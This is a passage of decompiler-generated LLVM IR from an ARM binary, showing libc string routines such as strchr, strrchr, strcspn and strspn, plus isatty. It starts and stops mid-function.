  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 15, 3, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 64, 60, 62, 61, 63, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_184d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18464, { 2, 0, 1 }
  uselistorder label %dec_label_pc_183f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18398, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18324, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_182e8, { 1, 0 }
  uselistorder label %dec_label_pc_182d4, { 1, 0 }
  uselistorder label %dec_label_pc_18294, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18228, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1815c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1812c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_180c8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18088, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_184f4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_184f4 = phi i32 [ %v0_184f4.pre, %bb ], [ %v5_184f4, %bb3 ]
  %v0_184f0 = phi i32 [ %tmp, %bb ], [ %v5_184f0, %bb3 ]
  %v1_184f0 = inttoptr i32 %v0_184f0 to i8*
  %v2_184f0 = load i8, i8* %v1_184f0, align 1
  %v1_184f4 = inttoptr i32 %v0_184f4 to i8*
  %v2_184f4 = load i8, i8* %v1_184f4, align 1
  %v3_184f4 = zext i8 %v2_184f4 to i32
  %v2_184f8 = icmp eq i8 %v2_184f0, 0
  br i1 %v2_184f8, label %.dec_label_pc_18504_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_184f4 = add i32 %v0_184f4, 1
  %v5_184f0 = add i32 %v0_184f0, 1
  %v3_184f0 = zext i8 %v2_184f0 to i32
  %v10_184fc = icmp eq i8 %v2_184f0, %v2_184f4
  br i1 %v10_184fc, label %entry, label %dec_label_pc_18504

.dec_label_pc_18504_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_18504

dec_label_pc_18504:                               ; preds = %bb3, %.dec_label_pc_18504_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_18504_crit_edge ], [ %v3_184f0, %bb3 ]
  %v2_18504.pre-phi = sub nsw i32 %.pn, %v3_184f4
  ret i32 %v2_18504.pre-phi

; uselistorder directives
  uselistorder i8 %v2_184f0, { 0, 2, 1 }
  uselistorder i32 %v0_184f0, { 1, 0 }
  uselistorder i32 %v0_184f4, { 1, 0 }
  uselistorder label %dec_label_pc_18504, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18574 = urem i32 %arg1, 256
  %v0_185943 = load i32, i32* @r0, align 4
  %v1_185944 = urem i32 %v0_185943, 4
  %v2_185945 = icmp eq i32 %v1_185944, 0
  br i1 %v2_185945, label %dec_label_pc_1859c, label %dec_label_pc_1857c

dec_label_pc_1857c:                               ; preds = %entry, %dec_label_pc_18590
  %v0_18590 = phi i32 [ %v1_18590, %dec_label_pc_18590 ], [ %v0_185943, %entry ]
  %v1_1857c = inttoptr i32 %v0_18590 to i8*
  %v2_1857c = load i8, i8* %v1_1857c, align 1
  %v3_1857c = zext i8 %v2_1857c to i32
  %v9_18580 = icmp eq i32 %v3_1857c, %v1_18574
  br i1 %v9_18580, label %dec_label_pc_18650, label %dec_label_pc_18588

dec_label_pc_18588:                               ; preds = %dec_label_pc_1857c
  %v2_18588 = icmp eq i8 %v2_1857c, 0
  br i1 %v2_18588, label %dec_label_pc_1864c, label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %dec_label_pc_18588
  %v1_18590 = add i32 %v0_18590, 1
  %v1_18594 = urem i32 %v1_18590, 4
  %v2_18594 = icmp eq i32 %v1_18594, 0
  br i1 %v2_18594, label %dec_label_pc_1859c, label %dec_label_pc_1857c

dec_label_pc_1859c:                               ; preds = %dec_label_pc_18590, %entry
  %v0_185a0 = phi i32 [ %v0_185943, %entry ], [ %v1_18590, %dec_label_pc_18590 ]
  %v4_1859c = mul nuw nsw i32 %v1_18574, 256
  %v5_1859c = or i32 %v4_1859c, %v1_18574
  %v4_185a4 = mul i32 %v5_1859c, 65536
  %v5_185a4 = or i32 %v4_185a4, %v5_1859c
  br label %dec_label_pc_185a8

dec_label_pc_185a8:                               ; preds = %dec_label_pc_18644, %dec_label_pc_185e4, %dec_label_pc_1859c
  %v0_1860c = phi i32 [ %v0_185a0, %dec_label_pc_1859c ], [ %v4_185a8, %dec_label_pc_185e4 ], [ %v4_185a8, %dec_label_pc_18644 ]
  %v1_185a8 = inttoptr i32 %v0_1860c to i32*
  %v2_185a8 = load i32, i32* %v1_185a8, align 4
  %v4_185a8 = add i32 %v0_1860c, 4
  %v2_185b0 = xor i32 %v2_185a8, %v5_185a4
  %v2_185bc = add i32 %v2_185a8, 2130640639
  %v1_185c0 = sub i32 -1, %v2_185a8
  %v2_185c4 = xor i32 %v2_185bc, %v1_185c0
  %v2_185d0 = and i32 %v2_185c4, -2130640640
  store i32 %v2_185d0, i32* @r1, align 4
  %v2_185d8 = icmp eq i32 %v2_185d0, 0
  br i1 %v2_185d8, label %dec_label_pc_185e4, label %dec_label_pc_185ec

dec_label_pc_185e4:                               ; preds = %dec_label_pc_185a8
  %v2_185b4 = add i32 %v2_185b0, 2130640639
  %v1_185cc = sub i32 -1, %v2_185b0
  %v2_185d4 = xor i32 %v2_185b4, %v1_185cc
  %v2_185dc = and i32 %v2_185d4, -2130640640
  %v2_185e4 = icmp eq i32 %v2_185dc, 0
  br i1 %v2_185e4, label %dec_label_pc_185a8, label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185a8, %dec_label_pc_185e4
  %v2_185ec = inttoptr i32 %v0_1860c to i8*
  %v3_185ec = load i8, i8* %v2_185ec, align 1
  %v4_185ec = zext i8 %v3_185ec to i32
  %v9_185f0 = icmp eq i32 %v4_185ec, %v1_18574
  br i1 %v9_185f0, label %dec_label_pc_18650, label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185ec
  %v2_185fc = icmp eq i8 %v3_185ec, 0
  br i1 %v2_185fc, label %dec_label_pc_1864c, label %dec_label_pc_18604

dec_label_pc_18604:                               ; preds = %dec_label_pc_185fc
  %v1_18604 = add i32 %v0_1860c, 1
  %v2_18604 = inttoptr i32 %v1_18604 to i8*
  %v3_18604 = load i8, i8* %v2_18604, align 1
  %v4_18604 = zext i8 %v3_18604 to i32
  %v9_18608 = icmp eq i32 %v4_18604, %v1_18574
  br i1 %v9_18608, label %dec_label_pc_18650, label %dec_label_pc_18614

dec_label_pc_18614:                               ; preds = %dec_label_pc_18604
  %v2_18614 = icmp eq i8 %v3_18604, 0
  br i1 %v2_18614, label %dec_label_pc_1864c, label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %dec_label_pc_18614
  %v1_1861c = add i32 %v0_1860c, 2
  %v2_1861c = inttoptr i32 %v1_1861c to i8*
  %v3_1861c = load i8, i8* %v2_1861c, align 1
  %v4_1861c = zext i8 %v3_1861c to i32
  %v9_18620 = icmp eq i32 %v4_1861c, %v1_18574
  br i1 %v9_18620, label %dec_label_pc_18650, label %dec_label_pc_1862c

dec_label_pc_1862c:                               ; preds = %dec_label_pc_1861c
  %v2_1862c = icmp eq i8 %v3_1861c, 0
  br i1 %v2_1862c, label %dec_label_pc_1864c, label %dec_label_pc_18634

dec_label_pc_18634:                               ; preds = %dec_label_pc_1862c
  %v1_18634 = add i32 %v0_1860c, 3
  %v2_18634 = inttoptr i32 %v1_18634 to i8*
  %v3_18634 = load i8, i8* %v2_18634, align 1
  %v4_18634 = zext i8 %v3_18634 to i32
  %v9_18638 = icmp eq i32 %v4_18634, %v1_18574
  br i1 %v9_18638, label %dec_label_pc_18650, label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_18634
  %v2_18644 = icmp eq i8 %v3_18634, 0
  br i1 %v2_18644, label %dec_label_pc_1864c, label %dec_label_pc_185a8

dec_label_pc_1864c:                               ; preds = %dec_label_pc_18588, %dec_label_pc_18644, %dec_label_pc_1862c, %dec_label_pc_18614, %dec_label_pc_185fc
  br label %dec_label_pc_18650

dec_label_pc_18650:                               ; preds = %dec_label_pc_1857c, %dec_label_pc_18634, %dec_label_pc_1861c, %dec_label_pc_18604, %dec_label_pc_185ec, %dec_label_pc_1864c
  %v1_18654 = phi i32 [ 0, %dec_label_pc_1864c ], [ %v1_18634, %dec_label_pc_18634 ], [ %v1_1861c, %dec_label_pc_1861c ], [ %v1_18604, %dec_label_pc_18604 ], [ %v0_1860c, %dec_label_pc_185ec ], [ %v0_18590, %dec_label_pc_1857c ]
  ret i32 %v1_18654

; uselistorder directives
  uselistorder i32 %v4_185a8, { 1, 0 }
  uselistorder i32 %v2_185a8, { 0, 2, 1 }
  uselistorder i32 %v0_1860c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1859c, { 1, 0 }
  uselistorder i32 %v1_18590, { 1, 0, 2 }
  uselistorder i32 %v0_185943, { 2, 1, 0 }
  uselistorder i32 %v1_18574, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_18650, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1864c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_185ec, { 1, 0 }
  uselistorder label %dec_label_pc_1857c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18664 = urem i32 %arg1, 256
  %v0_186842 = load i32, i32* @r0, align 4
  %v1_186843 = urem i32 %v0_186842, 4
  %v2_186844 = icmp eq i32 %v1_186843, 0
  br i1 %v2_186844, label %dec_label_pc_1868c, label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %entry, %dec_label_pc_18680
  %v0_18680 = phi i32 [ %v1_18680, %dec_label_pc_18680 ], [ %v0_186842, %entry ]
  %v1_1866c = inttoptr i32 %v0_18680 to i8*
  %v2_1866c = load i8, i8* %v1_1866c, align 1
  %v3_1866c = zext i8 %v2_1866c to i32
  %v9_18670 = icmp eq i32 %v3_1866c, %v1_18664
  br i1 %v9_18670, label %dec_label_pc_1873c, label %dec_label_pc_18678

dec_label_pc_18678:                               ; preds = %dec_label_pc_1866c
  %v2_18678 = icmp eq i8 %v2_1866c, 0
  br i1 %v2_18678, label %dec_label_pc_1873c, label %dec_label_pc_18680

dec_label_pc_18680:                               ; preds = %dec_label_pc_18678
  %v1_18680 = add i32 %v0_18680, 1
  %v1_18684 = urem i32 %v1_18680, 4
  %v2_18684 = icmp eq i32 %v1_18684, 0
  br i1 %v2_18684, label %dec_label_pc_1868c, label %dec_label_pc_1866c

dec_label_pc_1868c:                               ; preds = %dec_label_pc_18680, %entry
  %v0_18690 = phi i32 [ %v0_186842, %entry ], [ %v1_18680, %dec_label_pc_18680 ]
  %v4_1868c = mul nuw nsw i32 %v1_18664, 256
  %v5_1868c = or i32 %v4_1868c, %v1_18664
  %v4_18694 = mul i32 %v5_1868c, 65536
  %v5_18694 = or i32 %v4_18694, %v5_1868c
  br label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_18734, %dec_label_pc_186d4, %dec_label_pc_1868c
  %v0_186fc = phi i32 [ %v0_18690, %dec_label_pc_1868c ], [ %v4_18698, %dec_label_pc_186d4 ], [ %v4_18698, %dec_label_pc_18734 ]
  %v1_18698 = inttoptr i32 %v0_186fc to i32*
  %v2_18698 = load i32, i32* %v1_18698, align 4
  %v4_18698 = add i32 %v0_186fc, 4
  %v2_186a0 = xor i32 %v2_18698, %v5_18694
  %v2_186ac = add i32 %v2_18698, 2130640639
  %v1_186b0 = sub i32 -1, %v2_18698
  %v2_186b4 = xor i32 %v2_186ac, %v1_186b0
  %v2_186c0 = and i32 %v2_186b4, -2130640640
  store i32 %v2_186c0, i32* @r1, align 4
  %v2_186c8 = icmp eq i32 %v2_186c0, 0
  br i1 %v2_186c8, label %dec_label_pc_186d4, label %dec_label_pc_186dc

dec_label_pc_186d4:                               ; preds = %dec_label_pc_18698
  %v2_186a4 = add i32 %v2_186a0, 2130640639
  %v1_186bc = sub i32 -1, %v2_186a0
  %v2_186c4 = xor i32 %v2_186a4, %v1_186bc
  %v2_186cc = and i32 %v2_186c4, -2130640640
  %v2_186d4 = icmp eq i32 %v2_186cc, 0
  br i1 %v2_186d4, label %dec_label_pc_18698, label %dec_label_pc_186dc

dec_label_pc_186dc:                               ; preds = %dec_label_pc_18698, %dec_label_pc_186d4
  %v2_186dc = inttoptr i32 %v0_186fc to i8*
  %v3_186dc = load i8, i8* %v2_186dc, align 1
  %v4_186dc = zext i8 %v3_186dc to i32
  %v9_186e0 = icmp eq i32 %v4_186dc, %v1_18664
  br i1 %v9_186e0, label %dec_label_pc_1873c, label %dec_label_pc_186ec

dec_label_pc_186ec:                               ; preds = %dec_label_pc_186dc
  %v2_186ec = icmp eq i8 %v3_186dc, 0
  br i1 %v2_186ec, label %dec_label_pc_1873c, label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186ec
  %v1_186f4 = add i32 %v0_186fc, 1
  %v2_186f4 = inttoptr i32 %v1_186f4 to i8*
  %v3_186f4 = load i8, i8* %v2_186f4, align 1
  %v4_186f4 = zext i8 %v3_186f4 to i32
  %v9_186f8 = icmp eq i32 %v4_186f4, %v1_18664
  br i1 %v9_186f8, label %dec_label_pc_1873c, label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_186f4
  %v2_18704 = icmp eq i8 %v3_186f4, 0
  br i1 %v2_18704, label %dec_label_pc_1873c, label %dec_label_pc_1870c

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18704
  %v1_1870c = add i32 %v0_186fc, 2
  %v2_1870c = inttoptr i32 %v1_1870c to i8*
  %v3_1870c = load i8, i8* %v2_1870c, align 1
  %v4_1870c = zext i8 %v3_1870c to i32
  %v9_18710 = icmp eq i32 %v4_1870c, %v1_18664
  br i1 %v9_18710, label %dec_label_pc_1873c, label %dec_label_pc_1871c

dec_label_pc_1871c:                               ; preds = %dec_label_pc_1870c
  %v2_1871c = icmp eq i8 %v3_1870c, 0
  br i1 %v2_1871c, label %dec_label_pc_1873c, label %dec_label_pc_18724

dec_label_pc_18724:                               ; preds = %dec_label_pc_1871c
  %v1_18724 = add i32 %v0_186fc, 3
  %v2_18724 = inttoptr i32 %v1_18724 to i8*
  %v3_18724 = load i8, i8* %v2_18724, align 1
  %v4_18724 = zext i8 %v3_18724 to i32
  %v9_18728 = icmp eq i32 %v4_18724, %v1_18664
  br i1 %v9_18728, label %dec_label_pc_1873c, label %dec_label_pc_18734

dec_label_pc_18734:                               ; preds = %dec_label_pc_18724
  %v2_18734 = icmp eq i8 %v3_18724, 0
  br i1 %v2_18734, label %dec_label_pc_1873c, label %dec_label_pc_18698

dec_label_pc_1873c:                               ; preds = %dec_label_pc_18678, %dec_label_pc_1866c, %dec_label_pc_18734, %dec_label_pc_18724, %dec_label_pc_1871c, %dec_label_pc_1870c, %dec_label_pc_18704, %dec_label_pc_186f4, %dec_label_pc_186ec, %dec_label_pc_186dc
  %v1_18740 = phi i32 [ %v1_18724, %dec_label_pc_18734 ], [ %v1_18724, %dec_label_pc_18724 ], [ %v1_1870c, %dec_label_pc_1871c ], [ %v1_1870c, %dec_label_pc_1870c ], [ %v1_186f4, %dec_label_pc_18704 ], [ %v1_186f4, %dec_label_pc_186f4 ], [ %v0_186fc, %dec_label_pc_186ec ], [ %v0_186fc, %dec_label_pc_186dc ], [ %v0_18680, %dec_label_pc_1866c ], [ %v0_18680, %dec_label_pc_18678 ]
  ret i32 %v1_18740

; uselistorder directives
  uselistorder i32 %v4_18698, { 1, 0 }
  uselistorder i32 %v2_18698, { 0, 2, 1 }
  uselistorder i32 %v0_186fc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1868c, { 1, 0 }
  uselistorder i32 %v1_18680, { 1, 0, 2 }
  uselistorder i32 %v0_186842, { 2, 1, 0 }
  uselistorder i32 %v1_18664, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1873c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_186dc, { 1, 0 }
  uselistorder label %dec_label_pc_1866c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1874c = load i32, i32* @r4, align 4
  store i32 %v3_1874c, i32* %stack_var_-16, align 4
  %v6_1874c = load i32, i32* @r5, align 4
  %v9_1874c = load i32, i32* @r6, align 4
  %v0_18750 = load i32, i32* @r0, align 4
  %v0_18754 = load i32, i32* @r1, align 4
  store i32 %v0_18754, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_187708 = inttoptr i32 %v0_18750 to i8*
  %v2_187709 = load i8, i8* %v1_187708, align 1
  %v3_1877010 = zext i8 %v2_187709 to i32
  store i32 %v3_1877010, i32* @r1, align 4
  %v2_1877411 = icmp eq i8 %v2_187709, 0
  store i32 %v0_18754, i32* @r0, align 4
  %v1_1877c12 = add i32 %v0_18750, 1
  store i32 %v1_1877c12, i32* @r4, align 4
  br i1 %v2_1877411, label %dec_label_pc_18784, label %dec_label_pc_18760

dec_label_pc_18760:                               ; preds = %entry, %dec_label_pc_1876c
  %v3_1877014 = phi i32 [ %v3_18770, %dec_label_pc_1876c ], [ %v3_1877010, %entry ]
  %v0_1877813 = phi i32 [ %v0_18778.pre, %dec_label_pc_1876c ], [ %v0_18754, %entry ]
  %v2_18760 = call i32 @__GI_strchr(i32 %v0_1877813, i32 %v3_1877014)
  %v2_18764 = icmp eq i32 %v2_18760, 0
  %v0_1876c = load i32, i32* @r5, align 4
  br i1 %v2_18764, label %dec_label_pc_1876c, label %dec_label_pc_18784

dec_label_pc_1876c:                               ; preds = %dec_label_pc_18760
  %v1_1876c = add i32 %v0_1876c, 1
  %v0_18770.pre = load i32, i32* @r4, align 4
  %v0_18778.pre = load i32, i32* @r6, align 4
  store i32 %v1_1876c, i32* @r5, align 4
  %v1_18770 = inttoptr i32 %v0_18770.pre to i8*
  %v2_18770 = load i8, i8* %v1_18770, align 1
  %v3_18770 = zext i8 %v2_18770 to i32
  store i32 %v3_18770, i32* @r1, align 4
  %v2_18774 = icmp eq i8 %v2_18770, 0
  store i32 %v0_18778.pre, i32* @r0, align 4
  %v1_1877c = add i32 %v0_18770.pre, 1
  store i32 %v1_1877c, i32* @r4, align 4
  br i1 %v2_18774, label %dec_label_pc_18784, label %dec_label_pc_18760

dec_label_pc_18784:                               ; preds = %dec_label_pc_1876c, %dec_label_pc_18760, %entry
  %v0_18784 = phi i32 [ 0, %entry ], [ %v0_1876c, %dec_label_pc_18760 ], [ %v1_1876c, %dec_label_pc_1876c ]
  %v2_18788 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18788, i32* @r4, align 4
  store i32 %v6_1874c, i32* @r5, align 4
  store i32 %v9_1874c, i32* @r6, align 4
  ret i32 %v0_18784

; uselistorder directives
  uselistorder i32 %v3_18770, { 1, 0 }
  uselistorder i32 %v0_18778.pre, { 1, 0 }
  uselistorder i32 %v0_18770.pre, { 1, 0 }
  uselistorder label %dec_label_pc_18760, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_18794 = urem i32 %arg2, 256
  store i32 %v1_18794, i32* @r4, align 4
  %v2_18794 = icmp eq i32 %v1_18794, 0
  br i1 %v2_18794, label %dec_label_pc_187a8, label %dec_label_pc_187bc.preheader

dec_label_pc_187bc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_187c43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_18794)
  %v2_187c85 = icmp eq i32 %v2_187c43, 0
  br i1 %v2_187c85, label %dec_label_pc_187d0, label %dec_label_pc_187b4

dec_label_pc_187a8:                               ; preds = %entry
  %v2_187ac = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_187d4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187bc.preheader, %dec_label_pc_187b4
  %v2_187c46 = phi i32 [ %v2_187c4, %dec_label_pc_187b4 ], [ %v2_187c43, %dec_label_pc_187bc.preheader ]
  store i32 %v2_187c46, i32* @r5, align 4
  %v1_187b8 = add i32 %v2_187c46, 1
  store i32 %v1_187b8, i32* @r0, align 4
  %v0_187c0 = load i32, i32* @r4, align 4
  %v2_187c4 = call i32 @__GI_strchr(i32 %v1_187b8, i32 %v0_187c0)
  %v2_187c8 = icmp eq i32 %v2_187c4, 0
  br i1 %v2_187c8, label %dec_label_pc_187d0, label %dec_label_pc_187b4

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187b4, %dec_label_pc_187bc.preheader
  %v0_187d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %dec_label_pc_187a8, %dec_label_pc_187d0
  %storemerge = phi i32 [ %v2_187ac, %dec_label_pc_187a8 ], [ %v0_187d0, %dec_label_pc_187d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_187c4, { 1, 0 }
  uselistorder i32 %v1_187b8, { 1, 0 }
  uselistorder i32 %v1_18794, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_187d4, { 1, 0 }
  uselistorder label %dec_label_pc_187b4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_188102 = load i32, i32* @r0, align 4
  %v1_188103 = inttoptr i32 %v0_188102 to i8*
  %v2_188104 = load i8, i8* %v1_188103, align 1
  %v2_188146 = icmp eq i8 %v2_188104, 0
  br i1 %v2_188146, label %dec_label_pc_18820, label %dec_label_pc_187f4.preheader

dec_label_pc_187ec:                               ; preds = %dec_label_pc_187f4
  %v1_187fc = add i32 %v0_187fc, 1
  %v9_187ec = icmp eq i8 %v0_187ec10.in, %v2_187f4
  br i1 %v9_187ec, label %dec_label_pc_18808, label %dec_label_pc_187f4

dec_label_pc_187f4:                               ; preds = %dec_label_pc_187f4.preheader, %dec_label_pc_187ec
  %v0_187fc = phi i32 [ %tmp, %dec_label_pc_187f4.preheader ], [ %v1_187fc, %dec_label_pc_187ec ]
  %v1_187f4 = inttoptr i32 %v0_187fc to i8*
  %v2_187f4 = load i8, i8* %v1_187f4, align 1
  %v2_187f8 = icmp eq i8 %v2_187f4, 0
  br i1 %v2_187f8, label %dec_label_pc_18820, label %dec_label_pc_187ec

dec_label_pc_18808:                               ; preds = %dec_label_pc_187ec
  %v1_18808 = add i32 %v0_18808, 1
  %v1_1880c = add i32 %v0_1880c, 1
  %v1_18810 = inttoptr i32 %v1_1880c to i8*
  %v2_18810 = load i8, i8* %v1_18810, align 1
  %v2_18814 = icmp eq i8 %v2_18810, 0
  br i1 %v2_18814, label %dec_label_pc_18820, label %dec_label_pc_187f4.preheader

dec_label_pc_187f4.preheader:                     ; preds = %entry, %dec_label_pc_18808
  %v0_1880c = phi i32 [ %v1_1880c, %dec_label_pc_18808 ], [ %v0_188102, %entry ]
  %v0_18808 = phi i32 [ %v1_18808, %dec_label_pc_18808 ], [ 0, %entry ]
  %v0_187ec10.in = phi i8 [ %v2_18810, %dec_label_pc_18808 ], [ %v2_188104, %entry ]
  br label %dec_label_pc_187f4

dec_label_pc_18820:                               ; preds = %dec_label_pc_18808, %dec_label_pc_187f4, %entry
  %v0_18820 = phi i32 [ 0, %entry ], [ %v0_18808, %dec_label_pc_187f4 ], [ %v1_18808, %dec_label_pc_18808 ]
  ret i32 %v0_18820

; uselistorder directives
  uselistorder i8 %v2_187f4, { 1, 0 }
  uselistorder i32 %v0_187fc, { 1, 0 }
  uselistorder label %dec_label_pc_187f4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_18834 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_18834, i32* @r1, align 4
  %v0_18838 = call i32 @__GI_tcgetattr()
  %v1_1883c = sub i32 1, %v0_18838
  %v2_1883c = icmp ult i32 %v0_18838, 2
  br i1 %v2_1883c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1884c = phi i32 [ %v1_1883c, %entry ], [ 0, %bb ]
  ret i32 %v1_1884c

; uselistorder directives
  uselistorder i32 %v0_18838, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_18850 = load i32, i32* @r4, align 4
  %v6_18850 = load i32, i32* @r5, align 4
  %v9_18850 = load i32, i32* @r6, align 4
  %v2_18858 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1885c = load i32, i32* @r1, align 4
  store i32 %v0_1885c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_18868 = load i32, i32* @r0, align 4
